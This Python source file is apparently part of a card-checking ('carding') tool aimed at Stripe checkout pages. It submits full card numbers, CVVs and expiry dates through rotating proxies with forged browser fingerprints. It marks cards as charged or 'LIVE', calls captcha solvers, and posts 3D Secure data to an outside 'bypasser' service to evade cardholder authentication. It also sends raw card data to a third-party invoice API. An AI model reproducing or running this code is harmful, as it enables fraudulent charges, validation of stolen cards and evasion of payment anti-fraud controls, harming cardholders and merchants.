def _clean_stripe_response(text: str) -> str:
    """Clean and shorten Stripe error messages to human-readable form"""
    if not text:
        return text
    low = text.lower()
    if "authentication" in low and "failed" in low:
        return "Change Card or Proxy"
    if "integration surface" in low or "publishable key tokenization" in low:
        return "Restricted key"
    if "error" in low and "confirming" in low:
        m = re.search(r'`(\w+)`\s+is\s+required', text)
        if m:
            return f"Missing: {m.group(1)}"
        return "Confirm error"
    if "card number is longer" in low or "card number is shorter" in low:
        return "Invalid card number (unsupported BIN)"
    if "card_number_invalid" in low or "invalid card number" in low:
        return "Invalid card number"
    if "card_declined" in low or "card was declined" in low:
        return "Card declined"
    if "insufficient_funds" in low:
        return "Insufficient funds"
    if "expired_card" in low or "card has expired" in low:
        return "Card expired"
    if "incorrect_cvc" in low:
        return "Incorrect CVC"
    if "stolen_card" in low:
        return "Stolen card"
    if "lost_card" in low:
        return "Lost card"
    if "do_not_honor" in low:
        return "Do not honor"
    if "fraudulent" in low:
        return "Fraudulent"
    if "pickup_card" in low:
        return "Pickup card"
    if "restricted_card" in low:
        return "Restricted card"
    if "security_violation" in low:
        return "Security violation"
    if "service_not_allowed" in low:
        return "Service not allowed"
    if "transaction_not_allowed" in low:
        return "Transaction not allowed"
    text = re.sub(r'\s*\(https?://[^\)]+\)', '', text)
    text = re.sub(r'\s*See https?://\S+', '', text)
    text = re.sub(r'https?://\S+', '', text)
    text = re.sub(r'\s+', ' ', text).strip().rstrip('.')
    return text[:100]


def _is_confirm_error_msg(conf: dict) -> bool:
    """Check if the confirm response is a generic 'error confirming' message"""
    if "error" not in conf:
        return False
    msg = conf["error"].get("message", "").lower()
    return "error" in msg and "confirming" in msg


def _parse_confirm_response(conf: dict, checkout_data: dict, result: dict, start: float, init_data: dict, cs: str) -> dict:
    """Parse Stripe confirm response into a normalized result dict"""
    if "last_payment_error" in conf:
        err = conf["last_payment_error"]
        dc = err.get("decline_code", "")
        raw = err.get("message", "Declined")
        err_code = err.get("code", "")
        if err_code == "payment_intent_authentication_failure":
            result["status"] = "DECLINED"
            result["response"] = "3DS BYPASS FAILED - CC NOT SUPPORTED"
            result["message"] = "⚡ Code ➜ authentication_failed\n※ Declined Code ➜ N/A\n❖ Response ➜ 3DS BYPASS FAILED - CC NOT SUPPORTED"
            result["decline_code"] = "N/A"
            result["code"] = "authentication_failed"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        if dc:
            resp = f"[{dc}] {_clean_stripe_response(raw)}"
        else:
            resp = _clean_stripe_response(raw)
        result["status"] = "DECLINED"
        result["response"] = resp
        result["decline_code"] = dc or "N/A"
        result["code"] = err_code
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    if "error" in conf:
        err = conf["error"]
        dc = err.get("decline_code", "")
        raw = err.get("message", "Declined")
        err_code = err.get("code", "")
        if not dc and (err_code == "incorrect_cvc" or "security code" in raw.lower() or "incorrect_cvc" in err_code.lower()):
            dc = "incorrect_cvc"
        if "expired" in raw.lower() or "expired" in err_code.lower():
            result["status"] = "EXPIRED"
            result["response"] = "Session expired"
            result["decline_code"] = dc or "N/A"
        elif "integration surface" in raw.lower() or "tokenization" in raw.lower() or "unsupported" in raw.lower():
            result["status"] = "NOT SUPPORTED"
            result["response"] = "Checkout not supported"
            result["decline_code"] = "N/A"
        else:
            if dc:
                resp = f"[{dc}] {_clean_stripe_response(raw)}"
            else:
                resp = _clean_stripe_response(raw)
            if dc == "incorrect_cvc":
                result["status"] = "LIVE"
                result["response"] = resp
            else:
                result["status"] = "DECLINED"
                result["response"] = resp
            result["decline_code"] = dc or "N/A"
            result["code"] = err_code
    else:
        pi = conf.get("payment_intent") or {}
        si = conf.get("setup_intent") or {}
        st = ""
        if isinstance(pi, dict) and pi:
            st = pi.get("status", "")
        elif isinstance(si, dict) and si:
            st = si.get("status", "")
        else:
            st = conf.get("status", "")

        if isinstance(pi, dict) and "last_payment_error" in pi:
            err = pi["last_payment_error"]
            dc = err.get("decline_code", "")
            raw = err.get("message", "Declined")
            err_code = err.get("code", "")
            if err_code == "payment_intent_authentication_failure":
                result["status"] = "DECLINED"
                result["response"] = f"[authentication_failed] {_clean_stripe_response(raw)}"
                result["code"] = err_code
                result["decline_code"] = dc or "N/A"
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            if dc:
                resp = f"[{dc}] {_clean_stripe_response(raw)}"
            else:
                resp = _clean_stripe_response(raw)
            result["status"] = "DECLINED"
            result["response"] = resp
            result["decline_code"] = dc or "N/A"
            result["code"] = err_code
            result["time"] = round(time.perf_counter() - start, 2)
            return result

        is_setup = bool(si and isinstance(si, dict) and si.get("status"))

        if st in ["succeeded", "requires_capture"] or conf.get("payment_status") == "paid":
            price = checkout_data.get("price")
            currency = (checkout_data.get("currency") or "USD").upper()
            if price is not None:
                charged_msg = f"Charged {currency} {price}"
            else:
                charged_msg = "Payment Successful" if not is_setup else "Trial Activated (Card Saved)"
            result["status"] = "CHARGED"
            result["response"] = charged_msg
            result["decline_code"] = "N/A"
            result["code"] = "succeeded"
            success_url = init_data.get("success_url", "") or checkout_data.get("success_url", "")
            if success_url:
                success_url = success_url.replace("{CHECKOUT_SESSION_ID}", cs).replace("&amp;", "&")
            stripe_receipt = (pi.get("receipt_url") if isinstance(pi, dict) else None) or conf.get("receipt_url")
            result["receipt_url"] = stripe_receipt or success_url
            result["success_url"] = success_url
        elif st == "requires_action":
            result["status"] = "3DS_REQUIRED"
            result["response"] = "3D Secure Required"
            result["decline_code"] = "N/A"
            result["code"] = "requires_action"
        elif st == "requires_payment_method":
            result["status"] = "DECLINED"
            result["response"] = "CARD DECLINED - 3DS NOT SUPPORTED"
            result["decline_code"] = "N/A"
            result["code"] = "requires_payment_method"
        else:
            result["status"] = "UNKNOWN"
            result["response"] = st or "Unknown"
            result["decline_code"] = "N/A"
            result["code"] = "unknown"

        result["raw_response"] = json.dumps(conf)

    result["time"] = round(time.perf_counter() - start, 2)
    return result


async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, custom_email: str = None, bypass_3ds: bool = False, max_retries: int = 2) -> dict:
    start = time.perf_counter()
    card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
    bin_info_str = await _lookup_bin_online(card['cc'][:6])
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "decline_code": "N/A",
        "bin_info": bin_info_str,
        "time": 0
    }

    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")

    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    print(f"\n[CO] Card: {card_display} — Using TLS-client engine")

    proxy_url = get_proxy_url(proxy_str) if proxy_str else None

    try:
        from modules.stripe_tls import charge_card as tls_charge_card
        tls_result = await tls_charge_card(card, checkout_data, proxy_url, custom_email)

        tls_status = tls_result.get("status", "")
        tls_dc = tls_result.get("decline_code", "")

        if tls_status == "CHARGED":
            result["status"] = "CHARGED"
            result["response"] = tls_result.get("response", "Payment Successful")
            result["decline_code"] = "N/A"
            result["code"] = "succeeded"
            result["success_url"] = tls_result.get("success_url") or checkout_data.get("success_url", "")
            result["time"] = tls_result.get("time", round(time.perf_counter() - start, 2))
            print(f"[CO] TLS CHARGED: {result['response']} ({result['time']}s)")
            return result
        elif tls_status == "3DS":
            result["status"] = "3DS_REQUIRED"
            result["response"] = "3D Secure Required"
            result["decline_code"] = "N/A"
            result["code"] = "requires_action"
            result["pi_client_secret"] = tls_result.get("pi_client_secret", "")
            result["pi_id"] = tls_result.get("pi_id", "")
            result["time"] = tls_result.get("time", round(time.perf_counter() - start, 2))
            return result
        elif tls_status == "DECLINED":
            if tls_dc == "incorrect_cvc":
                result["status"] = "LIVE"
            else:
                result["status"] = "DECLINED"
            result["response"] = tls_result.get("response", "Card declined")
            result["decline_code"] = tls_dc or "N/A"
            result["code"] = tls_dc or "card_declined"
            result["time"] = tls_result.get("time", round(time.perf_counter() - start, 2))
            return result
        elif tls_status == "EXPIRED":
            result["status"] = "EXPIRED"
            result["response"] = "Session expired"
            result["decline_code"] = "N/A"
            result["time"] = tls_result.get("time", round(time.perf_counter() - start, 2))
            return result
        elif tls_status == "NOT SUPPORTED":
            result["status"] = "NOT SUPPORTED"
            result["response"] = tls_result.get("response", "Checkout not supported")
            result["decline_code"] = "N/A"
            result["time"] = tls_result.get("time", round(time.perf_counter() - start, 2))
            return result
        elif tls_status == "ERROR" and "Max retries" not in str(tls_result.get("response", "")):
            result["status"] = "ERROR"
            result["response"] = tls_result.get("response", "Unknown error")
            result["decline_code"] = "N/A"
            result["time"] = tls_result.get("time", round(time.perf_counter() - start, 2))
            return result
        else:
            print(f"[CO] TLS engine returned {tls_status}, falling back to aiohttp...")

    except ImportError:
        print("[CO] TLS client not available, using aiohttp fallback...")
    except Exception as tls_err:
        print(f"[CO] TLS engine error: {str(tls_err)[:60]}, falling back to aiohttp...")

    checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
    stripe_account = checkout_data.get("stripe_account")

    base_headers = get_stripe_headers(ref_url=f"{checkout_url}/", origin="https://checkout.stripe.com")
    if stripe_account and stripe_account.startswith("acct_"):
        base_headers["Stripe-Account"] = stripe_account

    lig = init_data.get("line_item_group")
    inv = init_data.get("invoice")
    if lig:
        total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
    elif inv:
        total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
    else:
        pi_amt = init_data.get("payment_intent") or {}
        total = subtotal = pi_amt.get("amount", 0)

    checkout_mode = checkout_data.get("checkout_mode") or init_data.get("mode", "payment")
    checksum = init_data.get("init_checksum", "")

    cust = init_data.get("customer") or {}
    addr_data = cust.get("address") or {}
    email = custom_email or init_data.get("customer_email") or checkout_data.get("email") or "john@example.com"
    name = cust.get("name") or "John Smith"
    country = addr_data.get("country") or "US"
    line1 = addr_data.get("line1") or "476 West White Mountain Blvd"
    city = addr_data.get("city") or "Pinetop"
    state = addr_data.get("state") or "AZ"
    zip_code = addr_data.get("postal_code") or "85929"

    print(f"[CO] aiohttp fallback for {card_display}")

    for attempt in range(max_retries + 1):
        try:
            s = await get_charge_session()
            fp = _generate_stripe_fingerprint()
            pm_body = (
                f"type=card"
                f"&card[number]={card['cc']}"
                f"&card[cvc]={card['cvv']}"
                f"&card[exp_month]={card['month']}"
                f"&card[exp_year]={card['year']}"
                f"&guid={fp['guid']}"
                f"&muid={fp['muid']}"
                f"&sid={fp['sid']}"
                f"&pasted_fields={fp['pasted_fields']}"
                f"&payment_user_agent={quote(fp['payment_user_agent'])}"
                f"&time_on_page={fp['time_on_page']}"
                f"&referrer={quote(fp['referrer'])}"
                f"&billing_details[name]={quote(name)}"
                f"&billing_details[email]={quote(email)}"
                f"&billing_details[address][country]={country}"
                f"&billing_details[address][line1]={quote(line1)}"
                f"&billing_details[address][city]={quote(city)}"
                f"&billing_details[address][postal_code]={zip_code}"
                f"&billing_details[address][state]={state}"
                f"&key={pk}"
            )

            async with s.post("https://api.stripe.com/v1/payment_methods", headers=base_headers, data=pm_body, proxy=proxy_url) as r:
                pm = await r.json()

            pm_id = None
            use_direct_confirm = False

            if "error" in pm:
                err_msg = pm["error"].get("message", "Card error")
                low_err = err_msg.lower()
                if ("integration surface" in low_err or "tokenization" in low_err
                        or "unsupported" in low_err or "elements" in low_err):
                    use_direct_confirm = True
                else:
                    result["status"] = "DECLINED"
                    result["response"] = _clean_stripe_response(err_msg)
                    result["decline_code"] = pm["error"].get("decline_code") or pm["error"].get("code") or "N/A"
                    result["raw_response"] = json.dumps(pm)
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
            else:
                pm_id = pm.get("id")

            if not pm_id and not use_direct_confirm:
                result["status"] = "FAILED"
                result["response"] = "No payment method ID"
                result["time"] = round(time.perf_counter() - start, 2)
                return result

            if use_direct_confirm:
                if checkout_mode == "setup":
                    conf_body = (
                        f"eid=NA"
                        f"&payment_method_data[type]=card"
                        f"&payment_method_data[card][number]={card['cc']}"
                        f"&payment_method_data[card][cvc]={card['cvv']}"
                        f"&payment_method_data[card][exp_month]={card['month']}"
                        f"&payment_method_data[card][exp_year]={card['year']}"
                        f"&payment_method_data[guid]={fp['guid']}"
                        f"&payment_method_data[muid]={fp['muid']}"
                        f"&payment_method_data[sid]={fp['sid']}"
                        f"&payment_method_data[pasted_fields]={fp['pasted_fields']}"
                        f"&payment_method_data[payment_user_agent]={quote(fp['payment_user_agent'])}"
                        f"&payment_method_data[billing_details][name]={quote(name)}"
                        f"&payment_method_data[billing_details][email]={quote(email)}"
                        f"&payment_method_data[billing_details][address][country]={country}"
                        f"&payment_method_data[billing_details][postal_code]={zip_code}"
                        f"&payment_method_data[billing_details][line1]={quote(line1)}"
                        f"&payment_method_data[billing_details][city]={quote(city)}"
                        f"&payment_method_data[billing_details][state]={state}"
                        f"&expected_amount=0"
                        f"&expected_payment_method_type=card"
                        f"&key={pk}"
                        f"&init_checksum={checksum}"
                        f"&consent[terms_of_service]=accepted"
                        f"&return_url=https://checkout.stripe.com"
                    )
                else:
                    conf_body = (
                        f"eid=NA"
                        f"&payment_method_data[type]=card"
                        f"&payment_method_data[card][number]={card['cc']}"
                        f"&payment_method_data[card][cvc]={card['cvv']}"
                        f"&payment_method_data[card][exp_month]={card['month']}"
                        f"&payment_method_data[card][exp_year]={card['year']}"
                        f"&payment_method_data[guid]={fp['guid']}"
                        f"&payment_method_data[muid]={fp['muid']}"
                        f"&payment_method_data[sid]={fp['sid']}"
                        f"&payment_method_data[pasted_fields]={fp['pasted_fields']}"
                        f"&payment_method_data[payment_user_agent]={quote(fp['payment_user_agent'])}"
                        f"&payment_method_data[billing_details][name]={quote(name)}"
                        f"&payment_method_data[billing_details][email]={quote(email)}"
                        f"&payment_method_data[billing_details][address][country]={country}"
                        f"&payment_method_data[billing_details][postal_code]={zip_code}"
                        f"&payment_method_data[billing_details][line1]={quote(line1)}"
                        f"&payment_method_data[billing_details][city]={quote(city)}"
                        f"&payment_method_data[billing_details][address][state]={state}"
                        f"&expected_amount={total}"
                        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                        f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                        f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                        f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                        f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                        f"&expected_payment_method_type=card"
                        f"&key={pk}"
                        f"&init_checksum={checksum}"
                        f"&consent[terms_of_service]=accepted"
                        f"&return_url=https://checkout.stripe.com"
                    )
            else:
                if checkout_mode == "setup":
                    conf_body = (
                        f"eid=NA"
                        f"&payment_method={pm_id}"
                        f"&expected_amount=0"
                        f"&expected_payment_method_type=card"
                        f"&key={pk}"
                        f"&init_checksum={checksum}"
                        f"&consent[terms_of_service]=accepted"
                        f"&return_url=https://checkout.stripe.com"
                    )
                else:
                    conf_body = (
                        f"eid=NA"
                        f"&payment_method={pm_id}"
                        f"&expected_amount={total}"
                        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                        f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                        f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                        f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                        f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                        f"&expected_payment_method_type=card"
                        f"&key={pk}"
                        f"&init_checksum={checksum}"
                        f"&consent[terms_of_service]=accepted"
                        f"&return_url=https://checkout.stripe.com"
                    )

            async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=base_headers, data=conf_body, proxy=proxy_url) as r:
                conf = await r.json()

                if _is_confirm_error_msg(conf):
                    retry1_body = re.sub(r'&consent\[terms_of_service\]=accepted', '', conf_body)
                    async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=base_headers, data=retry1_body, proxy=proxy_url) as r1:
                        conf1 = await r1.json()
                    if not _is_confirm_error_msg(conf1):
                        conf = conf1
                    else:
                        retry2_body = re.sub(r'&expected_amount=\d+', '&expected_amount=0', conf_body)
                        retry2_body = re.sub(r'&last_displayed_line_item_group_details\[[^\]]+\]=\d+', '', retry2_body)
                        async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=base_headers, data=retry2_body, proxy=proxy_url) as r2:
                            conf2 = await r2.json()
                        if not _is_confirm_error_msg(conf2):
                            conf = conf2

                is_captcha, sitekey, captcha_type = detect_captcha_challenge(conf)
                if is_captcha:
                    max_captcha_retries = 2
                    captcha_solved = False
                    for c_attempt in range(max_captcha_retries + 1):
                        token = None
                        if captcha_type == "turnstile":
                            token = await solve_turnstile(sitekey, checkout_url)
                        elif captcha_type in ["recaptcha2", "recaptcha"]:
                            token = await solve_recaptcha_v2(sitekey, checkout_url)
                        if token:
                            result["captcha_bypassed"] = True
                            async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=base_headers, data=conf_body + f"&captcha_token={token}", proxy=proxy_url) as r:
                                conf = await r.json()
                            is_captcha, sitekey, captcha_type = detect_captcha_challenge(conf)
                            if not is_captcha:
                                captcha_solved = True
                                break
                    if not captcha_solved and is_captcha:
                        result["status"] = "CAPTCHA"
                        result["response"] = "CAPTCHA Bypass Failed"
                        result["time"] = round(time.perf_counter() - start, 2)
                        return result

                try:
                    pi = conf.get("payment_intent") or {}
                    next_action = {}
                    if isinstance(pi, dict) and pi.get("next_action"):
                        next_action = pi.get("next_action")
                    elif conf.get("next_action"):
                        next_action = conf.get("next_action")

                    def _find_in_obj(obj, key_name):
                        if isinstance(obj, dict):
                            if key_name in obj:
                                return obj[key_name]
                            for v in obj.values():
                                found = _find_in_obj(v, key_name)
                                if found is not None:
                                    return found
                        elif isinstance(obj, list):
                            for item in obj:
                                found = _find_in_obj(item, key_name)
                                if found is not None:
                                    return found
                        return None

                    creq = _find_in_obj(next_action, "creq") or _find_in_obj(conf, "creq")
                    na_type = (next_action.get("type") or "").lower() if isinstance(next_action, dict) else ""

                    needs_3ds = False
                    if na_type and ("3ds" in na_type or "authenticate" in na_type or "use_stripe_sdk" in na_type or "redirect" in na_type):
                        needs_3ds = True
                    if not needs_3ds and (creq or any(k in str(next_action).lower() for k in ["creq", "three_d_secure", "3ds"])):
                        needs_3ds = True

                    if needs_3ds and bypass_3ds:
                        print(f"[CO] 3DS detected (type={na_type}) - attempting bypass, creq={'present' if creq else 'missing'}")

                        source = _find_in_obj(next_action, "three_d_secure_2_source") or _find_in_obj(next_action, "source")
                        if not source or not str(source).startswith(("payatt_", "tdsrc_", "src_")):
                            def _find_id(obj, prefix):
                                if isinstance(obj, dict):
                                    for v in obj.values():
                                        if isinstance(v, str) and v.startswith(prefix):
                                            return v
                                        found = _find_id(v, prefix)
                                        if found:
                                            return found
                                elif isinstance(obj, list):
                                    for item in obj:
                                        found = _find_id(item, prefix)
                                        if found:
                                            return found
                                return None
                            for pref in ("payatt_", "tdsrc_", "src_"):
                                source = _find_id(conf, pref)
                                if source:
                                    break

                        server_txn_id = (_find_in_obj(next_action, "server_transaction_id")
                                         or _find_in_obj(conf, "server_transaction_id"))

                        if not source:
                            print("[CO] No 3DS source found; skipping bypass")
                        else:
                            bypass_url = "https://premium.dotbypasser.workers.dev/v1/3ds2/authenticate"

                            fingerprint_data = ""
                            if server_txn_id:
                                fp_json = json.dumps({"threeDSServerTransID": str(server_txn_id)})
                                fingerprint_data = base64.b64encode(fp_json.encode()).decode().rstrip("=")

                            ts_now = int(time.time() * 1000)
                            ts_start = ts_now - random.randint(1500, 3000)
                            fe_json = json.dumps({
                                "fingerprintOutcome": "captured",
                                "fingerprintCompletedAt": ts_now,
                                "fingerprintTimeout": 10,
                                "fingerprintStartedAt": ts_start
                            })
                            frontend_execution = base64.b64encode(fe_json.encode()).decode()

                            browser_obj = {
                                "fingerprintAttempted": True,
                                "fingerprintData": fingerprint_data,
                                "challengeWindowSize": None,
                                "threeDSCompInd": "Y",
                                "browserJavaEnabled": False,
                                "browserJavascriptEnabled": True,
                                "browserLanguage": "en-GB",
                                "browserColorDepth": "32",
                                "browserScreenHeight": "960",
                                "browserScreenWidth": "1536",
                                "browserTZ": "360",
                                "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
                            }
                            browser_json = json.dumps(browser_obj, separators=(',', ':'))

                            payload = {
                                "source": source,
                                "browser": browser_json,
                                "one_click_authn_device_support[hosted]": "false",
                                "one_click_authn_device_support[same_origin_frame]": "false",
                                "one_click_authn_device_support[spc_eligible]": "true",
                                "one_click_authn_device_support[webauthn_eligible]": "true",
                                "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
                                "frontend_execution": frontend_execution,
                                "key": pk
                            }

                            bypass_headers = dict(base_headers)
                            bypass_headers["origin"] = "https://js.stripe.com"
                            bypass_headers["referer"] = "https://js.stripe.com/"

                            print(f"[CO] Bypass payload: source={source}, txn_id={server_txn_id}")

                            try:
                                async with s.post(bypass_url, data=payload, headers=bypass_headers, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=15)) as br:
                                    try:
                                        bypass_resp = await br.json()
                                    except Exception:
                                        bypass_resp = {"status_code": br.status, "text": await br.text()}
                                print(f"[CO] Bypass response: {str(bypass_resp)[:400]}")

                                if isinstance(bypass_resp, dict) and bypass_resp.get("state") == "succeeded":
                                    if isinstance(pi, dict):
                                        pi["status"] = "succeeded"
                                        pi["receipt_url"] = bypass_resp.get("receipt_url") or pi.get("receipt_url")
                                        conf["payment_intent"] = pi
                                    else:
                                        conf["payment_intent"] = {"status": "succeeded", "receipt_url": bypass_resp.get("receipt_url")}
                                    conf["payment_status"] = "paid"
                                    conf["three_d_secure_2"] = bypass_resp
                                    result["secondary_response"] = f"3DS bypass used: {bypass_resp.get('id', 'dot_bypasser')}"

                                    print("[CO] Checking PI after bypass...")
                                    pi = conf.get("payment_intent", {})
                                    pi_id = pi.get("id") if isinstance(pi, dict) else None
                                    client_secret = pi.get("client_secret") if isinstance(pi, dict) else None

                                    if pi_id and client_secret:
                                        pi_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
                                        async with s.get(pi_url, headers=base_headers, proxy=proxy_url) as pi_r:
                                            pi_resp = await pi_r.json()
                                        print(f"[CO] PI: {json.dumps(pi_resp)[:1500]}")

                                        pi_err = pi_resp.get("last_payment_error", {})
                                        if pi_err.get("code") == "payment_intent_authentication_failure":
                                            print("[CO] Auth failure after bypass - retrying with new PM...")
                                            old_pm_id = pi_err.get("payment_method", {}).get("id") if isinstance(pi_err.get("payment_method"), dict) else None
                                            if not old_pm_id:
                                                pm_data = pi_resp.get("payment_method")
                                                if isinstance(pm_data, dict):
                                                    old_pm_id = pm_data.get("id")

                                            if old_pm_id:
                                                new_pm_body = (
                                                    f"type=card"
                                                    f"&card[number]={card['cc']}"
                                                    f"&card[cvc]={card['cvv']}"
                                                    f"&card[exp_month]={card['month']}"
                                                    f"&card[exp_year]={card['year']}"
                                                    f"&billing_details[name]={quote(name)}"
                                                    f"&billing_details[email]={quote(email)}"
                                                    f"&key={pk}"
                                                )
                                                async with s.post("https://api.stripe.com/v1/payment_methods", headers=base_headers, data=new_pm_body, proxy=proxy_url) as pm_r:
                                                    new_pm = await pm_r.json()

                                                if new_pm.get("id"):
                                                    print(f"[CO] Created new PM: {new_pm['id']}")
                                                    pi_id = pi_resp.get("id")
                                                    pi_secret = pi_resp.get("client_secret")
                                                    confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
                                                    confirm_body = f"payment_method={new_pm['id']}&client_secret={pi_secret}"
                                                    async with s.post(confirm_url, headers=base_headers, data=confirm_body, proxy=proxy_url) as confirm_r:
                                                        confirm_result = await confirm_r.json()

                                                    print(f"[CO] Retry confirm: {json.dumps(confirm_result)[:600]}")

                                                    retry_err = confirm_result.get("last_payment_error", {})
                                                    if confirm_result.get("status") == "succeeded":
                                                        result["status"] = "CHARGED"
                                                        result["response"] = f"Charged {checkout_data.get('currency', 'USD')} {checkout_data.get('price', '0')}"
                                                        result["code"] = "succeeded"
                                                        result["time"] = round(time.perf_counter() - start, 2)
                                                        return result
                                                    elif retry_err.get("decline_code") == "incorrect_cvc":
                                                        result["status"] = "LIVE"
                                                        result["response"] = f"[incorrect_cvc] {_clean_stripe_response(retry_err.get('message', 'Incorrect CVC'))}"
                                                        result["decline_code"] = "incorrect_cvc"
                                                        result["time"] = round(time.perf_counter() - start, 2)
                                                        return result
                                                    elif retry_err:
                                                        dc = retry_err.get("decline_code", "")
                                                        raw = retry_err.get("message", "Declined")
                                                        result["status"] = "DECLINED"
                                                        result["response"] = f"[{dc}] {_clean_stripe_response(raw)}" if dc else _clean_stripe_response(raw)
                                                        result["decline_code"] = dc or "N/A"
                                                        result["time"] = round(time.perf_counter() - start, 2)
                                                        return result

                                        if pi_resp.get("status") == "succeeded":
                                            result["status"] = "CHARGED"
                                            result["response"] = f"Charged {checkout_data.get('currency', 'USD')} {checkout_data.get('price', '0')}"
                                            result["code"] = "succeeded"
                                            result["time"] = round(time.perf_counter() - start, 2)
                                            return result
                                        elif pi_resp.get("status") in ("requires_action", "requires_payment_method"):
                                            pi_err2 = pi_resp.get("last_payment_error") or {}
                                            dc2 = pi_err2.get("decline_code", "")
                                            raw2 = pi_err2.get("message", "Authentication failed")
                                            result["status"] = "DECLINED"
                                            result["response"] = f"[{dc2}] {_clean_stripe_response(raw2)}" if dc2 else _clean_stripe_response(raw2)
                                            result["decline_code"] = dc2 or "N/A"
                                            result["time"] = round(time.perf_counter() - start, 2)
                                            return result
                                    else:
                                        result["status"] = "CHARGED"
                                        result["response"] = f"Charged {checkout_data.get('currency', 'USD')} {checkout_data.get('price', '0')}"
                                        result["code"] = "succeeded"
                                        result["time"] = round(time.perf_counter() - start, 2)
                                        return result
                                else:
                                    result["status"] = "DECLINED"
                                    result["response"] = "3DS BYPASS FAILED - CC NOT SUPPORTED"
                                    result["decline_code"] = "N/A"
                                    result["code"] = "authentication_failed"
                                    result["time"] = round(time.perf_counter() - start, 2)
                                    return result
                            except Exception as be:
                                print(f"[CO] Bypass request error: {be}")

                    if needs_3ds and not bypass_3ds:
                        result["status"] = "3DS_REQUIRED"
                        result["response"] = "3D Secure Required"
                        result["decline_code"] = "N/A"
                        result["code"] = "requires_action"
                        pi_inner = conf.get("payment_intent") or {}
                        if isinstance(pi_inner, dict):
                            result["pi_client_secret"] = pi_inner.get("client_secret", "")
                            result["pi_id"] = pi_inner.get("id", "")
                        result["time"] = round(time.perf_counter() - start, 2)
                        return result

                except Exception as na_err:
                    print(f"[CO] next_action parse error: {na_err}")

                result = _parse_confirm_response(conf, checkout_data, result, start, init_data, cs)
                return result

        except aiohttp.ClientError as e:
            err_str = str(e)
            if attempt < max_retries:
                print(f"[CO] Network error attempt {attempt+1}: {err_str[:50]}... retrying")
                await asyncio.sleep(2 ** attempt)
                continue
            result["status"] = "ERROR"
            result["response"] = f"Network error: {err_str[:60]}"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        except Exception as e:
            err_str = str(e)
            if attempt < max_retries:
                print(f"[CO] Error attempt {attempt+1}: {err_str[:50]}... retrying")
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = f"Error: {err_str[:60]}"
            result["time"] = round(time.perf_counter() - start, 2)
            return result

    result["status"] = "ERROR"
    result["response"] = "Max retries exceeded"
    result["time"] = round(time.perf_counter() - start, 2)
    return result


async def check_single_card(checkout_url: str, card: dict, proxy_str: str = None, use_browser_fallback: bool = False) -> dict:
    start_time = time.perf_counter()

    async def _do_check():
        if "invoice.stripe.com/i/" in checkout_url:
            payload = {
                "key": "BRY-KESNP-TUPWH-JFOT9",
                "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
                "invoice_url": checkout_url
            }
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as s:
                    async with s.post("https://api.barryxapi.xyz/stripe_invoice", json=payload, headers={"Content-Type": "application/json"}) as res:
                        data = await res.json()
                        api_result = data.get("result", {}) if isinstance(data.get("result"), dict) else data
                        raw_status = api_result.get("status", data.get("status", data.get("response", "DECLINED")))
                        status = str(raw_status).upper()
                        message = "Unknown Response"
                        message_sources = [api_result, data]
                        message_keys = ["message", "error", "msg", "reason", "details", "decline_code"]
                        for src in message_sources:
                            for key in message_keys:
                                val = src.get(key)
                                if val and isinstance(val, str):
                                    message = val
                                    break
                            if message != "Unknown Response":
                                break
                        elapsed = round(time.perf_counter() - start_time, 2)
                        return {
                            "status": status,
                            "response": message,
                            "merchant": "Stripe Invoice",
                            "product": "Invoice Payment",
                            "amount": api_result.get("amount") or "Unknown",
                            "time": elapsed
                        }
            except Exception as e:
                return {
                    "status": "ERROR",
                    "response": f"API Error: {str(e)[:50]}",
                    "merchant": "Stripe Invoice",
                    "product": "Invoice Payment",
                    "amount": "0.00",
                    "time": round(time.perf_counter() - start_time, 2)
                }

        if not checkout_url or len(checkout_url.strip()) < 10:
            return {
                "status": "ERROR",
                "response": "No checkout URL provided",
                "merchant": "ERROR: No checkout URL provided",
                "product": "Unknown",
                "amount": "0.00",
                "time": 0
            }

        checkout_info = await get_checkout_info(checkout_url, proxy_str)
        if checkout_info.get("error"):
            merchant_name = "ERROR: No checkout URL provided" if not checkout_url else (checkout_info.get("merchant") or "Unknown")
            return {
                "status": "ERROR",
                "response": checkout_info["error"],
                "merchant": merchant_name,
                "product": "Unknown",
                "amount": "0.00",
                "time": checkout_info.get("time", 0)
            }

